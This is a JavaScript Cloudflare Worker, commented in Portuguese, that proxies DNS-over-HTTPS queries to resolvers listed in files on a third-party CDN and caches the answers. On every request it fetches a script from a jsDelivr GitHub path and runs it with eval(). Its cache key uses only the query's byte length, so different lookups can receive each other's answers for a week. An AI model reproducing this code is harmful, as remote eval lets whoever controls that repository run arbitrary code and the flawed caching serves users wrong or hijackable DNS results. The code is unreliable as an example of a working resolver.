addEventListener('fetch', (event) => {
  event.respondWith(handleRequest(event));
});

async function handleRequest(event) {
  const request = event.request;
  const url = new URL(request.url);

  // Executa script externo
  await runRemoteScript('meu_script.js');

  // Redireciona se o hostname for 'doh.illuminat.org'
  if (url.hostname === 'doh.illuminat.org') {
    return Response.redirect('https://illuminat.org', 301);
  }

  if (url.pathname.endsWith('/dns-query')) {
    try {
      const query = await request.arrayBuffer();
      const cache = caches.default;
      const cacheKey = new Request(request.url + query.byteLength, { method: 'GET' });

      const cached = await cache.match(cacheKey);
      if (cached) return cached;

      const dnsResponse = await queryDnsWithCDNs(query);
      const response = new Response(dnsResponse, {
        headers: {
          'Content-Type': 'application/dns-message',
          'Cache-Control': 'public, max-age=604800',
        },
      });

      event.waitUntil(cache.put(cacheKey, response.clone()));
      return response;
    } catch (err) {
      console.error('Erro na consulta DNS:', err);
      return new Response('Erro na consulta DNS', { status: 500 });
    }
  }

  return new Response('🚀 Tudo pronto! Nossos servidores estão online.', { status: 404 });
}

// Consulta DNS com seus CDNs e lista externa
async function queryDnsWithCDNs(query) {
  const config = await fetchJsonCDN('config.json');
  const dnsList = await fetchJsonCDN('dns_servers.json');

  const allServers = shuffleArray([
    ...config.customCDNs,
    ...dnsList
  ]);

  for (const server of allServers) {
    try {
      const response = await fetch(server, {
        method: 'POST',
        headers: { 'Content-Type': 'application/dns-message' },
        body: query,
      });

      if (response.ok) return response.arrayBuffer();
    } catch (err) {
      console.warn(`Erro ao consultar ${server}:`, err);
    }
  }

  return udpDnsQueryFallback(query);
}

async function fetchJsonCDN(filename) {
  const url = `https://cdn.jsdelivr.net/gh/lukajsantos/dns_cache/${filename}`;
  const response = await fetch(url, {
    cf: { cacheTtl: 604800, cacheEverything: true }
  });
  return response.json();
}

async function runRemoteScript(filename) {
  const url = `https://cdn.jsdelivr.net/gh/lukajsantos/dns_cache/${filename}`;
  try {
    const res = await fetch(url, {
      cf: { cacheTtl: 3600, cacheEverything: true }
    });
    const code = await res.text();
    eval(code); // Executa o script remotamente
  } catch (err) {
    console.warn(`Erro ao carregar script externo ${filename}:`, err);
  }
}

async function udpDnsQueryFallback(query) {
  return new Uint8Array(); // Resposta vazia
}

function shuffleArray(array) {
  const arr = [...array];
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

